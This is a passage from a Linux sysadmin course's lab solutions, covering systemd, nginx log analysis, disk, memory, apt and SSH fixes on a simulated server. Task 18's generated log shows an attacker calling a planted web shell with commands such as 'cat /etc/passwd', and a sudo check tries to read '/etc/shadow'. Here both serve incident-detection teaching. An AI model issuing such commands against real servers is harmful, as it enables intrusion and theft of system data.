/etc/sudoers.d/priya-nginx: parsed OK
$ sudo -u priya sudo -n nginx -t
nginx: the configuration file /etc/nginx/nginx.conf syntax is ok
nginx: configuration file /etc/nginx/nginx.conf test is successful
$ sudo -u priya sudo -n cat /etc/shadow
sudo: a password is required
```

Exactly two commands, and nothing more: least privilege. Never edit sudoers with plain `sed -i` or `nano`: one typo there and sudo stops working for everyone.

</details>

---

## M02 · L03 Processes, Signals and systemd

### 10 · Why is the server slow? (Investigate)
Read the load average and compare it with the number of CPUs. Take one snapshot of `top` and find the process at the top. Then answer: what is it, who runs it, what's its PID and its **parent** PID, what state is it in, and how long has it been running?

<details>
<summary>Hint</summary>

`uptime`, `nproc`, `top -bn1 | head -12` (one snapshot, batch mode). `pgrep -a python3` lists PIDs with their command lines. `ps -o pid,ppid,user,stat,%cpu,etime,cmd -p <PID>` picks the columns you want.

</details>

<details>
<summary>Answer</summary>

Your PIDs, load and memory figures will differ.

```text
$ uptime
 10:58:35 up  2:06,  0 user,  load average: 0.58, 0.62, 0.62
$ nproc
10
$ top -bn1 | head -12
top - 10:58:35 up  2:06,  0 user,  load average: 0.58, 0.62, 0.62
Tasks:  22 total,   2 running,  20 sleeping,   0 stopped,   0 zombie
%Cpu(s): 10.2 us,  0.0 sy,  0.0 ni, 89.8 id,  0.0 wa,  0.0 hi,  0.0 si,  0.0 st
MiB Mem :   7936.0 total,   5196.8 free,    809.0 used,   2202.6 buff/cache
MiB Swap:   1024.0 total,   1024.0 free,      0.0 used.   7127.0 avail Mem

    PID USER      PR  NI    VIRT    RES    SHR S  %CPU  %MEM     TIME+ COMMAND
     82 priya     20   0   14388   8360   5624 R 100.0   0.1   0:37.75 python3
      1 root      20   0   20844  11584   8904 S   0.0   0.1   0:00.12 systemd
     24 root      19  -1   50220  19076  17984 S   0.0   0.2   0:00.06 systemd+
     81 allcs     20   0   14632   9212   5616 S   0.0   0.1   0:00.00 python3
     83 root      20   0    4164   2428   2196 S   0.0   0.0   0:00.00 cron
$ pgrep -a python3
81 /usr/bin/python3 /opt/allcsvideos/encoder.py
82 /usr/bin/python3 /home/priya/reindex.py
$ ps -o pid,ppid,user,stat,%cpu,etime,cmd -p $(pgrep -u priya python3)
    PID    PPID USER     STAT %CPU     ELAPSED CMD
     82       1 priya    Rs   99.9       00:37 /usr/bin/python3 /home/priya/reindex.py
```

A `python3` process run by **priya**, `/home/priya/reindex.py`, is in state `R` at 100 percent of one CPU. On this 10-CPU machine that's `us` about 10 percent overall: one CPU completely busy. Its parent is PID 1, so no shell owns it. The `up 2:06` is the uptime of Docker's virtual machine, not of the container. On a single-CPU server, this process alone would take the whole machine.

</details>

### 11 · It keeps coming back (Investigate)
Stop that process the right way. First try a plain `kill` as Asha, then as root. Check again a second later: what happened, and **why**? Find who is restarting it, read its unit file, and stop it for good: now, and at the next boot.

<details>
<summary>Hint</summary>

`kill` sends TERM, the polite signal; you may only signal your own processes. After the kill, `pgrep` again and compare the PID. `systemctl status <PID>` tells you which unit a process belongs to, and `systemctl cat` shows the unit file. Look at the `Restart=` line. `systemctl disable --now` stops a unit and removes it from boot.

</details>

<details>
<summary>Answer</summary>

```text
$ pid=$(pgrep -u priya python3)
$ echo $pid
82
$ kill $pid
bash: kill: (82) - Operation not permitted
$ sudo kill $pid
$ pgrep -a -u priya python3
453 /usr/bin/python3 /home/priya/reindex.py
$ systemctl status $(pgrep -u priya python3) | head -3
● allcsvideos-reindex.service - allcsvideos search reindex (temporary, Priya)
     Loaded: loaded (/etc/systemd/system/allcsvideos-reindex.service; enabled; preset: enabled)
     Active: active (running) since Tue 2026-10-20 10:58:35 UTC; 842ms ago
$ systemctl cat allcsvideos-reindex
# /etc/systemd/system/allcsvideos-reindex.service
[Unit]
Description=allcsvideos search reindex (temporary, Priya)

[Service]
User=priya
ExecStart=/usr/bin/python3 /home/priya/reindex.py
Restart=always

[Install]
WantedBy=multi-user.target
$ sudo systemctl disable --now allcsvideos-reindex
Removed "/etc/systemd/system/multi-user.target.wants/allcsvideos-reindex.service".
$ systemctl is-active allcsvideos-reindex
inactive
$ systemctl is-enabled allcsvideos-reindex
disabled
$ pgrep -a -u priya python3
```

As Asha, `kill` is refused: the process belongs to priya. As root, TERM works, but less than a second later there's a **new** PID. It's a systemd service with `Restart=always`, so systemd starts it again after any exit, even a clean one. Killing a service's process only fights systemd. Stop it through systemd: `disable --now` stops it now and removes the boot symlink, so it stays stopped after a reboot. The script itself is `while True: pass`, a loop that never ends; it goes back to Priya to fix.

</details>

### 12 · The API is down (Investigate)
List the units that failed since boot. Read the API's status and its journal, then find the exact reason it can't start. What does `203/EXEC` mean, and why did systemd stop retrying?

<details>
<summary>Hint</summary>

`systemctl --failed`, `systemctl status allcsvideos-api`, `journalctl -u allcsvideos-api -b` (this boot only). `systemctl cat` shows the unit file. Then check, with `ls -l`, that the program in `ExecStart` really exists.

</details>

<details>
<summary>Answer</summary>

```text
$ systemctl --failed
  UNIT                    LOAD   ACTIVE SUB    DESCRIPTION
● allcsvideos-api.service loaded failed failed allcsvideos API
…
1 loaded units listed.
$ systemctl status allcsvideos-api
× allcsvideos-api.service - allcsvideos API
     Loaded: loaded (/etc/systemd/system/allcsvideos-api.service; enabled; preset: enabled)
     Active: failed (Result: exit-code) since Tue 2026-10-20 10:58:03 UTC; 32s ago
   Duration: 480us
   Main PID: 147 (code=exited, status=203/EXEC)
        CPU: 520us

Oct 20 10:58:03 web-01 systemd[1]: allcsvideos-api.service: Scheduled restart job, restart counter is at 5.
Oct 20 10:58:03 web-01 systemd[1]: allcsvideos-api.service: Start request repeated too quickly.
Oct 20 10:58:03 web-01 systemd[1]: allcsvideos-api.service: Failed with result 'exit-code'.
Oct 20 10:58:03 web-01 systemd[1]: Failed to start allcsvideos-api.service - allcsvideos API.
$ journalctl -u allcsvideos-api -b | head -4
Oct 20 10:57:57 web-01 systemd[1]: Started allcsvideos-api.service - allcsvideos API.
Oct 20 10:57:57 web-01 systemd[1]: allcsvideos-api.service: Main process exited, code=exited, status=203/EXEC
Oct 20 10:57:57 web-01 systemd[1]: allcsvideos-api.service: Failed with result 'exit-code'.
Oct 20 10:57:58 web-01 systemd[1]: allcsvideos-api.service: Scheduled restart job, restart counter is at 1.
$ systemctl cat allcsvideos-api
# /etc/systemd/system/allcsvideos-api.service
[Unit]
Description=allcsvideos API
After=network.target

[Service]
User=allcs
ExecStart=/usr/bin/pyhton3 /opt/allcsvideos/api.py
Restart=on-failure
RestartSec=1

[Install]
WantedBy=multi-user.target
$ ls -l /usr/bin/pyhton3
ls: cannot access '/usr/bin/pyhton3': No such file or directory
$ ls -l /usr/bin/python3
lrwxrwxrwx 1 root root 10 Nov 12  2025 /usr/bin/python3 -> python3.12
```

`status=203/EXEC` is systemd's code for "I couldn't run the program in ExecStart at all": the process never even started, which is why it lasted 480 microseconds and printed nothing. The program is `/usr/bin/pyhton3`, with two letters swapped. `Restart=on-failure` tried again every second, until the start limit (by default 5 starts in 10 seconds): "Start request repeated too quickly", and the unit stays failed.

</details>

### 13 · Fix the unit file
Fix the typo in the API's unit, make systemd reread it, and restart the API. Show that it's running, that it answers on port 8080 directly, and through nginx.

<details>
<summary>Hint</summary>

`sudo sed -i 's#old#new#'` edits the file in place (a `#` separator avoids escaping the slashes), or use `sudo nano`. After editing any unit file: `sudo systemctl daemon-reload`. Then `restart`, `status` and `curl`.

</details>

<details>
<summary>Answer</summary>

```text
$ sudo sed -i 's#/usr/bin/pyhton3#/usr/bin/python3#' /etc/systemd/system/allcsvideos-api.service
$ grep ExecStart /etc/systemd/system/allcsvideos-api.service
ExecStart=/usr/bin/python3 /opt/allcsvideos/api.py
$ sudo systemctl daemon-reload
$ sudo systemctl restart allcsvideos-api
$ systemctl status allcsvideos-api
● allcsvideos-api.service - allcsvideos API
     Loaded: loaded (/etc/systemd/system/allcsvideos-api.service; enabled; preset: enabled)
     Active: active (running) since Tue 2026-10-20 10:58:36 UTC; 1s ago
   Main PID: 542 (python3)
      Tasks: 1 (limit: 9520)
     Memory: 9.1M (peak: 9.2M)
        CPU: 26ms
     CGroup: /system.slice/allcsvideos-api.service
             └─542 /usr/bin/python3 /opt/allcsvideos/api.py

Oct 20 10:58:36 web-01 systemd[1]: Started allcsvideos-api.service - allcsvideos API.
Oct 20 10:58:36 web-01 python3[542]: allcsvideos-api: listening on port 8080
$ curl -s localhost:8080/health
{"status": "ok"}
$ curl -s localhost/api/courses
{"courses": ["devops", "dsa", "system-design"]}
```

Without `daemon-reload`, systemd keeps using the old copy of the unit, with the typo, and warns you that the file changed on disk. The API starts as `allcs` and reads `app.env` through the group permission from task 8. The 502 from task 3 is gone.

</details>

### 14 · Prove it heals itself
`Restart=on-failure` should bring the API back after a crash. Prove it: find the API's main PID from systemd, crash it on purpose with `kill -9`, watch the state, and show the new PID and what the journal recorded. Why would a plain `kill` (TERM) **not** bring it back?

<details>
<summary>Hint</summary>

`systemctl show -p MainPID --value allcsvideos-api`. Check `systemctl is-active` straight after the kill, and again two seconds later. `journalctl -u allcsvideos-api -n 5` shows the last five lines.

</details>

<details>
<summary>Answer</summary>

```text
$ systemctl show -p MainPID --value allcsvideos-api
542
$ sudo kill -9 $(systemctl show -p MainPID --value allcsvideos-api)
$ systemctl is-active allcsvideos-api
activating
$ systemctl is-active allcsvideos-api
active
$ systemctl show -p MainPID --value allcsvideos-api
570
$ journalctl -u allcsvideos-api -n 5
Oct 20 10:58:38 web-01 systemd[1]: allcsvideos-api.service: Main process exited, code=killed, status=9/KILL
Oct 20 10:58:38 web-01 systemd[1]: allcsvideos-api.service: Failed with result 'signal'.
Oct 20 10:58:39 web-01 systemd[1]: allcsvideos-api.service: Scheduled restart job, restart counter is at 1.
Oct 20 10:58:39 web-01 systemd[1]: Started allcsvideos-api.service - allcsvideos API.
Oct 20 10:58:39 web-01 python3[570]: allcsvideos-api: listening on port 8080
$ curl -s localhost/api/health
{"status": "ok"}
```

`activating` is systemd waiting out `RestartSec=1`. Then a new main PID, 570. A KILL counts as a failure, so `on-failure` restarts it. Exiting on TERM counts as a clean stop, so `on-failure` would leave it down: that's what `systemctl stop` relies on. (Compare task 11: `Restart=always` restarts even after a clean stop.)

</details>

---

## M02 · L04 Text Processing

Tasks 15 to 19 use last night's nginx access log, `/var/log/nginx/access.log.1` (the rotated copy, so your own requests don't change the counts). It's a **generated sample**, built by the lab in nginx's combined format. Asha can read it because she's in the `adm` group. Remember the fields: 1 is the client IP, 4 the time, 6 and 7 the method (with a leading quote) and the path, 9 the status, 10 the bytes.

### 15 · Size up the log
How big is the log, in bytes and in lines? Show the first line. Then count every status code in it, most common first.

<details>
<summary>Hint</summary>

`ls -lh`, `wc -l < file` (just the number). Field 9 is the status: `cut -d' ' -f9`, then `sort`, `uniq -c`, `sort -rn`.

</details>

<details>
<summary>Answer</summary>

```text
$ cd /var/log/nginx
$ ls -lh access.log.1
-rw-r----- 1 www-data adm 889K Oct 20 10:57 access.log.1
$ wc -l < access.log.1
6348
$ head -n 1 access.log.1
203.0.113.54 - - [19/Oct/2026:22:00:02 +0000] "GET /static/app.js HTTP/1.1" 200 187342 "-" "Mozilla/5.0 (Linux; Android 14; Pixel 8) Chrome/129.0 Mobile"
$ cut -d' ' -f9 access.log.1 | sort | uniq -c | sort -rn
   5037 200
    903 401
    241 404
    161 502
      4 507
      2 201
```

Two things stand out already: 903 failed logins (401), and 165 server errors (5xx: 161 of 502 and 4 of 507). `uniq -c` only merges neighbouring lines, which is why `sort` comes first.

</details>

### 16 · Who hits us hardest?
Find the top 5 client IP addresses. For the busiest one, show which method, path and status it sends, with counts, and the time of its first and last request. What is it doing?

<details>
<summary>Hint</summary>

The top-N pipeline: `cut -d' ' -f1 | sort | uniq -c | sort -rn | head -5`. Then `awk '$1 == "…" {print $6, $7, $9}'`. For the times, `grep '^IP '` (the space stops `192.0.2.6` from matching `192.0.2.66`), then `head -n 1` or `tail -n 1`, then field 4.

</details>

<details>
<summary>Answer</summary>

```text
$ cut -d' ' -f1 access.log.1 | sort | uniq -c | sort -rn | head -5
    903 192.0.2.66
    506 203.0.113.30
    401 203.0.113.31
    276 203.0.113.32
    233 203.0.113.33
$ awk '$1 == "192.0.2.66" {print $6, $7, $9}' access.log.1 | sort | uniq -c
    903 "POST /login 401
$ grep '^192.0.2.66 ' access.log.1 | head -n 1 | cut -d' ' -f4
[19/Oct/2026:23:30:02
$ grep '^192.0.2.66 ' access.log.1 | tail -n 1 | cut -d' ' -f4
[20/Oct/2026:00:15:00
```

All 903 requests from 192.0.2.66 are `POST /login` with 401, wrong password, in 45 minutes: someone guessing passwords. Every 401 in the log is this one address. Blocking it is firewall work, in Module 4. (The quote before `POST` is part of field 6, because the request is quoted in the log.)

</details>

### 17 · Two different outages (Investigate)
List every server error (status 500 or more) by status, method and path, with counts. Then find when each kind of error **started**. There are two different problems hiding in here: what are they, and in which order did they happen?

<details>
<summary>Hint</summary>

`awk '$9 >= 500 {print $9, $6, $7}'`. The upload paths carry a `?name=…` query string: `cut -d'?' -f1` drops it so they group together. For the start times, `awk '$9 == 507' | head -n 1`, and the same for 502.

</details>

<details>
<summary>Answer</summary>

```text
$ awk '$9 >= 500' access.log.1 | wc -l
165
$ awk '$9 >= 500 {print $9, $6, $7}' access.log.1 | cut -d'?' -f1 | sort | uniq -c | sort -rn
    120 502 "GET /api/courses
     39 502 "POST /api/checkout
      4 507 "POST /api/upload
      2 502 "POST /api/upload
$ awk '$9 == 507' access.log.1 | head -n 1 | cut -d' ' -f4
[20/Oct/2026:02:47:12
$ awk '$9 == 502' access.log.1 | head -n 1 | cut -d' ' -f4
[20/Oct/2026:02:58:37
$ awk '$9 == 502' access.log.1 | tail -n 1 | cut -d' ' -f4
[20/Oct/2026:04:00:05
```

First, from **02:47**, uploads fail with **507 Insufficient Storage**: the API is up, but it can't write the file. That's the full data disk (tasks 20 to 22). Then, from **02:58**, **every** API path fails with **502 Bad Gateway**, until the end of the log: nginx can't reach the API at all. That's the broken unit file (tasks 12 and 13). Two causes, eleven minutes apart. If you only counted "5xx", you'd have chased one problem.

</details>

### 18 · Was the planted shell used? (Investigate)
Task 7 found `shell.php` in the uploads folder. Search the log: was it ever requested? By whom, when, with which commands, and what status did it get? What else did that address try first?

<details>
<summary>Hint</summary>

`grep -c` counts. `awk '{print $1, $4, $7, $9}'` keeps the useful fields. Then `grep` that address and print its requests in order. `grep -E '\.php|/\.env'` finds all the probing.

</details>

<details>
<summary>Answer</summary>

```text
$ grep -c 'shell.php' access.log.1
3
$ grep 'shell.php' access.log.1 | awk '{print $1, $4, $7, $9}'
192.0.2.14 [20/Oct/2026:01:16:33 /uploads/shell.php?cmd=id 200
192.0.2.14 [20/Oct/2026:01:17:07 /uploads/shell.php?cmd=uname+-a 200
192.0.2.14 [20/Oct/2026:01:18:08 /uploads/shell.php?cmd=cat+/etc/passwd 200
$ grep '^192.0.2.14 ' access.log.1 | awk '{print $4, $7, $9}'
[20/Oct/2026:01:12:25 /wp-login.php 404
[20/Oct/2026:01:13:23 /.env 404
[20/Oct/2026:01:14:30 /xmlrpc.php 404
[20/Oct/2026:01:15:44 /admin/ 404
[20/Oct/2026:01:16:33 /uploads/shell.php?cmd=id 200
[20/Oct/2026:01:17:07 /uploads/shell.php?cmd=uname+-a 200
[20/Oct/2026:01:18:08 /uploads/shell.php?cmd=cat+/etc/passwd 200
$ grep -E '\.php|/\.env' access.log.1 | cut -d' ' -f1 | sort -u
192.0.2.14
```

Yes. 192.0.2.14 scanned for the usual weak spots (404 each time), then requested `shell.php` three times, with commands in `cmd=`, and got 200. On this server nginx has no PHP, so it only sent the file back as text, and the commands never ran. On a server with PHP enabled, they would have run as `www-data`. That's why "777, someone will fix it later" is an incident, and why Rahul gets this in the report.

</details>

### 19 · An excerpt for the incident report
Meera uploads from 203.0.113.25. Build one pipeline that prints all her requests as `IP time file status`, with the last part of the IP hidden (`203.0.113.x`), the `[` and the `/api/upload?name=` prefix removed. Save it to `~/meera-uploads.txt` for the ticket.

<details>
<summary>Hint</summary>

`grep` her lines, `awk` the four fields, then `sed -E` with a capture group: `s/^([0-9]+\.[0-9]+\.[0-9]+)\.[0-9]+/\1.x/`. A second `sed` can run two substitutions separated by `;`. Use `#` as the separator when the pattern contains slashes.

</details>

<details>
<summary>Answer</summary>

```text
$ grep -c '^203.0.113.25 ' access.log.1
8
$ grep '^203.0.113.25 ' access.log.1 | awk '{print $1, $4, $7, $9}' | sed -E 's/^([0-9]+\.[0-9]+\.[0-9]+)\.[0-9]+/\1.x/' | sed 's/\[//; s#/api/upload?name=##'
203.0.113.x 19/Oct/2026:22:41:09 lesson-02.mp4 201
203.0.113.x 19/Oct/2026:23:58:40 lesson-03.mp4 201
203.0.113.x 20/Oct/2026:02:47:12 lesson-04.mp4 507
203.0.113.x 20/Oct/2026:02:49:55 lesson-04.mp4 507
203.0.113.x 20/Oct/2026:02:53:31 lesson-04.mp4 507
203.0.113.x 20/Oct/2026:02:56:02 lesson-04.mp4 507
203.0.113.x 20/Oct/2026:03:05:44 lesson-04.mp4 502
203.0.113.x 20/Oct/2026:03:12:19 lesson-04.mp4 502
$ grep '^203.0.113.25 ' access.log.1 | awk '{print $1, $4, $7, $9}' | sed -E 's/^([0-9]+\.[0-9]+\.[0-9]+)\.[0-9]+/\1.x/' | sed 's/\[//; s#/api/upload?name=##' > ~/meera-uploads.txt
$ wc -l ~/meera-uploads.txt
8 /home/asha/meera-uploads.txt
```

Meera's story in eight lines: lessons 2 and 3 uploaded fine (201). Lesson 4 failed four times with 507 while the disk was full, then twice more with 502 once the API was down too. In `\1.x`, `\1` puts back what the brackets captured.

</details>

---

## M02 · L05 Disks, Memory and Packages

### 20 · What's full? (Investigate)
Find the full filesystem. Rule out inodes. Then measure what's actually in it, and look for big files. Do the numbers agree? What does that tell you?

<details>
<summary>Hint</summary>

`df -h` (all, then just `/data`), `df -i /data`. `sudo du -sh /data/*` sums each folder, and `sudo du -sh /data` the whole disk. `sudo find /data -size +10M -exec ls -lh {} \;` lists big files. (`sudo`, because the log folder belongs to `allcs`.)

</details>

<details>
<summary>Answer</summary>

```text
$ df -h
Filesystem      Size  Used Avail Use% Mounted on
overlay         911G   20G  845G   3% /
tmpfs            64M     0   64M   0% /dev
shm              64M     0   64M   0% /dev/shm
tmpfs            64M   64M     0 100% /data
tmpfs           3.9G   56K  3.9G   1% /run
tmpfs           3.9G     0  3.9G   0% /run/lock
/dev/vda1       911G   20G  845G   3% /etc/hosts
$ df -h /data
Filesystem      Size  Used Avail Use% Mounted on
tmpfs            64M   64M     0 100% /data
$ df -i /data
Filesystem     Inodes IUsed IFree IUse% Mounted on
tmpfs            4096     8  4088    1% /data
$ sudo du -sh /data/*
21M	/data/logs
9.0M	/data/uploads
$ sudo du -sh /data
30M	/data
$ sudo find /data -size +10M -exec ls -lh {} \;
-rw-r----- 1 allcs adm 21M Oct 18 23:59 /data/logs/api.log.1
```

The data disk is 100 percent full, but only 8 of its 4096 inodes are used, so it's space, not inodes. `df` says 64 megabytes are used, while `du` can only find 30. `du` adds up the files it can see by name; `df` asks the filesystem for every used block. About 34 megabytes belong to something with no name: a file that was **deleted while a process still has it open**. Your system disk sizes will differ.

</details>

### 21 · Free the space without deleting anything else
Find the deleted-but-open file, the process that holds it, and the service it belongs to. Then make that process let go of it **without** stopping the service, and prove the space came back. (Hint from the lesson: this service reopens its log on HUP.)

<details>
<summary>Hint</summary>

`sudo lsof +L1` lists open files with a link count below 1: deleted, but open. `systemctl status <PID>` names the unit. `sudo kill -HUP <PID>` asks it to reopen its log. Then `df -h /data` and `lsof +L1` again.

</details>

<details>
<summary>Answer</summary>

```text
$ sudo lsof +L1
COMMAND PID  USER   FD   TYPE DEVICE SIZE/OFF NLINK NODE NAME
python3  81 allcs    3w   REG   0,79 36696064     0    8 /data/logs/encoder.log (deleted)
$ ps -o pid,user,cmd -p $(pgrep -f encoder.py)
    PID USER     CMD
     81 allcs    /usr/bin/python3 /opt/allcsvideos/encoder.py
$ systemctl status $(pgrep -f encoder.py) | head -1
● allcsvideos-encoder.service - allcsvideos video encoder
$ sudo kill -HUP $(pgrep -f encoder.py)
$ df -h /data
Filesystem      Size  Used Avail Use% Mounted on
tmpfs            64M   30M   35M  46% /data
$ sudo lsof +L1
$ sudo ls -l /data/logs
total 20484
-rw-r----- 1 allcs adm 20971558 Oct 18 23:59 api.log.1
-rw-r--r-- 1 allcs adm        0 Oct 20 10:58 encoder.log
```

The encoder (`allcsvideos-encoder.service`, user `allcs`) held `encoder.log` open as file descriptor 3, for writing: 36,696,064 bytes, link count 0. Someone had deleted it with `rm` in a panic, which removed only the name. HUP made the encoder close it and open a fresh `encoder.log`, so the kernel finally freed the blocks: 100 percent down to 46. `sudo systemctl restart allcsvideos-encoder` would also work, at the cost of a restart. Next time: **truncate, don't delete** a log that's in use: `sudo truncate -s 0 <file>` empties it in place and frees the space at once.

</details>

### 22 · The old rotated log
`api.log.1` is yesterday's rotated debug log. Nothing has it open (check with task 21's `lsof`). Make it take a fraction of the space without losing a line, and show the new size and the disk. Then read its last two lines **without** unpacking it.

<details>
<summary>Hint</summary>

`gzip` replaces a file with a compressed `.gz` copy. `zcat` prints a compressed file's contents. Text logs compress very well.

</details>

<details>
<summary>Answer</summary>

```text
$ ls -lh /data/logs
total 21M
-rw-r----- 1 allcs adm 21M Oct 18 23:59 api.log.1
-rw-r--r-- 1 allcs adm   0 Oct 20 10:58 encoder.log
$ sudo gzip /data/logs/api.log.1
$ ls -lh /data/logs
total 2.0M
-rw-r----- 1 allcs adm 2.0M Oct 18 23:59 api.log.1.gz
-rw-r--r-- 1 allcs adm    0 Oct 20 10:58 encoder.log
$ df -h /data
Filesystem      Size  Used Avail Use% Mounted on
tmpfs            64M   11M   54M  18% /data
$ sudo zcat /data/logs/api.log.1.gz | tail -n 2
2026-10-18T23:07:45 DEBUG cache lookup key=course:123:lesson:32 hit=false took=2ms
2026-10-18T23:07:46 DEBUG cache lookup key=course:177:lesson:9 hit=true took=8ms
```

21 megabytes down to 2: the disk is at 18 percent. `gzip` keeps the owner, mode and date. This is what logrotate's `compress` option does for you every day, and setting up logrotate for the API is Module 3 work. The real cause, debug logging left on, gets an owner and an end date.

</details>

### 23 · Is memory a problem? (Investigate)
Show memory in human-readable units. Which number tells you whether the server is short of memory, and is it? Then list the three processes using the most **real** memory.

<details>
<summary>Hint</summary>

`free -h`: read **available**, not free. `ps aux --sort=-rss | head -n 4` sorts by RSS, the memory a process really holds.

</details>

<details>
<summary>Answer</summary>

Your numbers will differ: the container sees the memory of Docker's virtual machine.

```text
$ free -h
               total        used        free      shared  buff/cache   available
Mem:           7.8Gi       806Mi       5.1Gi        20Mi       2.1Gi       7.0Gi
Swap:          1.0Gi          0B       1.0Gi
$ ps aux --sort=-rss | head -n 4
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root          24  0.1  0.2  50220 19180 ?        S<s  10:57   0:00 /usr/lib/systemd/systemd-journald
allcs        570  0.6  0.2  99676 18520 ?        Ss   10:58   0:00 /usr/bin/python3 /opt/allcsvideos/api.py
root           1  0.4  0.1  21088 11752 ?        Ss   10:57   0:00 /sbin/init
```

**available**, 7.0 gigabytes, is free memory plus cache that can be dropped the moment a program needs it, so memory is fine. `free` is lower because Linux uses spare memory as cache (2.1 gigabytes here), and that's good. No swap is used. The biggest process, the journal, holds about 19 megabytes. Tonight's slowness was CPU (task 10), not memory.

</details>

### 24 · Install a tool with apt
Asha wants `ncdu`. Try to run it, then try to install it, and explain the error. Fix it, install it, and check it with `dpkg`. Then use `dpkg` the other way round: which package owns `/usr/sbin/nginx`, and which nginx version is installed?

<details>
<summary>Hint</summary>

`apt` reads a local list of packages. A fresh image ships with that list empty, so `sudo apt update` comes first. `dpkg -l <package>` shows the install state, `dpkg -S <file>` finds the owning package, and `apt-cache policy` shows the installed and candidate versions. This task needs the internet.

</details>

<details>
<summary>Answer</summary>

Versions, sizes and download counts are from 20 October 2026, on an arm64 Mac, so `arm64` reads `amd64` on most Windows and Intel machines.

```text
$ ncdu --version
bash: ncdu: command not found
$ sudo apt install -y ncdu
…
E: Unable to locate package ncdu
$ sudo apt update
…
Get:1 http://ports.ubuntu.com/ubuntu-ports noble InRelease [256 kB]
…
Fetched 35.6 MB in 8s (4587 kB/s)
Reading package lists...
Building dependency tree...
Reading state information...
All packages are up to date.
$ sudo apt install -y ncdu
…
The following NEW packages will be installed:
  ncdu
0 upgraded, 1 newly installed, 0 to remove and 0 not upgraded.
Need to get 49.3 kB of archives.
After this operation, 158 kB of additional disk space will be used.
Get:1 http://ports.ubuntu.com/ubuntu-ports noble/universe arm64 ncdu arm64 1.19-0.1 [49.3 kB]
…
Setting up ncdu (1.19-0.1) ...
$ dpkg -l ncdu | tail -n 1
ii  ncdu           1.19-0.1     arm64        ncurses disk usage viewer
$ which ncdu
/usr/bin/ncdu
$ dpkg -S /usr/sbin/nginx
nginx: /usr/sbin/nginx
$ apt-cache policy nginx | head -n 3
nginx:
  Installed: 1.24.0-2ubuntu7.18
  Candidate: 1.24.0-2ubuntu7.18
```

"Unable to locate package" doesn't mean the package doesn't exist. It means the local package list is empty: the image's build deleted it to save space. `apt update` downloads the lists, and then the install works. `ii` means: wanted installed, and installed. apt also prints a warning that it has no stable command-line interface: in scripts, use `apt-get -y`. Try `sudo ncdu /data` now: arrow keys move, Enter opens a folder, `q` quits.

</details>

---

## M02 · L06 SSH and Remote Servers

Web-01 runs a real OpenSSH server. With no second machine in this lab, you'll SSH from web-01 to itself (`localhost`), which exercises exactly the same client, server, keys and config.

### 25 · sshd won't start
Try a key login to `localhost`. It fails before authentication even starts. Find out why from systemd and from `sshd` itself, fix the hardening file, test it, and restart SSH. Then print the settings `sshd` really uses for root logins, passwords and allowed users.

<details>
<summary>Hint</summary>

`ssh -o BatchMode=yes localhost hostname` never prompts, it just fails. `systemctl is-active ssh.socket ssh`, `journalctl -u ssh`. `sudo sshd -t` tests the config and names the line. If `sshd -t` complains about a missing directory, that folder is normally made by the service when it starts: `sudo install -d -m 755 /run/sshd`. `sudo sshd -T` prints the effective settings.

</details>

<details>
<summary>Answer</summary>

```text
$ ssh -o BatchMode=yes localhost hostname
kex_exchange_identification: read: Connection reset by peer
Connection reset by ::1 port 22
$ systemctl is-active ssh.socket ssh
failed
failed
$ journalctl -u ssh -n 3
Oct 20 10:58:54 web-01 systemd[1]: ssh.service: Start request repeated too quickly.
Oct 20 10:58:54 web-01 systemd[1]: ssh.service: Failed with result 'exit-code'.
Oct 20 10:58:54 web-01 systemd[1]: Failed to start ssh.service - OpenBSD Secure Shell server.
$ sudo sshd -t
/etc/ssh/sshd_config.d/10-hardening.conf: line 3: Bad configuration option: KbdInteractiveAuthenticaton
/etc/ssh/sshd_config.d/10-hardening.conf: terminating, 1 bad configuration options
$ sudo sed -i 's/KbdInteractiveAuthenticaton/KbdInteractiveAuthentication/' /etc/ssh/sshd_config.d/10-hardening.conf
$ sudo sshd -t
Missing privilege separation directory: /run/sshd
$ sudo install -d -m 755 /run/sshd
$ sudo sshd -t && echo syntax OK
syntax OK
$ sudo systemctl restart ssh
$ systemctl is-active ssh.socket ssh
active
active
$ sudo sshd -T | grep -E '^(permitrootlogin|passwordauthentication|kbdinteractiveauthentication|allowusers)'
permitrootlogin no
passwordauthentication no
kbdinteractiveauthentication no
allowusers asha
allowusers priya
```

On Ubuntu 24.04, systemd listens on port 22 (`ssh.socket`) and starts `sshd` when someone connects. Your login started it, `sshd` refused its own config, and after five quick failures systemd gave up on both units. The cause: `KbdInteractiveAuthenticaton`, with an "i" missing, on line 3. `/run/sshd` is created by the service at start, and the failed starts had removed it. This is why you always run `sshd -t` **before** a restart, and keep a working session open: on a real server, a broken sshd config can lock everyone out. (If `restart` says "start request repeated too quickly", wait ten seconds and try again.)

</details>

### 26 · The key that's ignored
SSH is up, but Asha's key login is refused, although her public key is in `authorized_keys`. Find out why from **both** sides: the client's verbose output and the server's log. Fix it and prove the key works.

<details>
<summary>Hint</summary>

`ssh -v` narrates every step: `grep` for `Offering` and `Authentications that can continue`. The server's reason is in `journalctl -u ssh`: `grep -i refused`. Then look at the modes of `~/.ssh`. sshd insists that nobody else can change your key files.

</details>

<details>
<summary>Answer</summary>

Your key fingerprint will differ: each build makes its own key.

```text
$ ssh -o BatchMode=yes localhost hostname
asha@localhost: Permission denied (publickey).
$ ssh -v -o BatchMode=yes localhost hostname 2>&1 | grep -E 'Offering|Authentications that can continue'
debug1: Authentications that can continue: publickey
debug1: Offering public key: /home/asha/.ssh/id_ed25519 ED25519 SHA256:HtZ++qb8bXP8BsHXfw/8086Qqnfjh+EZrCyHQMGRydU
debug1: Authentications that can continue: publickey
$ sudo journalctl -u ssh | grep -i refused
Oct 20 10:59:06 web-01 sshd[1041]: Authentication refused: bad ownership or modes for directory /home/asha/.ssh
Oct 20 10:59:06 web-01 sshd[1045]: Authentication refused: bad ownership or modes for directory /home/asha/.ssh
$ ls -ld ~/.ssh
drwxrwxrwx 2 asha asha 4096 Oct 20 10:57 /home/asha/.ssh
$ ls -l ~/.ssh
total 16
-rw------- 1 asha asha  93 Oct 20 10:57 authorized_keys
-rw------- 1 asha asha 399 Oct 20 10:57 id_ed25519
-rw-r--r-- 1 asha asha  93 Oct 20 10:57 id_ed25519.pub
-rw-r--r-- 1 asha asha  91 Oct 20 10:57 known_hosts
$ chmod 700 ~/.ssh
$ ssh -o BatchMode=yes localhost hostname
web-01
$ ssh -v -o BatchMode=yes localhost true 2>&1 | grep -E 'Server accepts key|Authenticated'
